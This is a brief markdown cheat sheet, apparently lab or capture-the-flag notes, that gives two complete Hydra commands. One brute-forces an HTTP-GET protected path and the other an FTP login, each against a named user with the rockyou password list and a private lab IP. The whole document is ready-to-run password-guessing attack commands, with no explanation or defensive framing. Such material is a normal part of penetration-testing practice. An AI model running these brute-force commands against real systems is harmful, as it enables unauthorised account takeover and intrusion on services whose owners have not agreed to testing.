# Hydra Usage

## HTTP-GET
```
hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.71.162 http-get /protected
```

## FTP
```
hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.173.92 ftp
```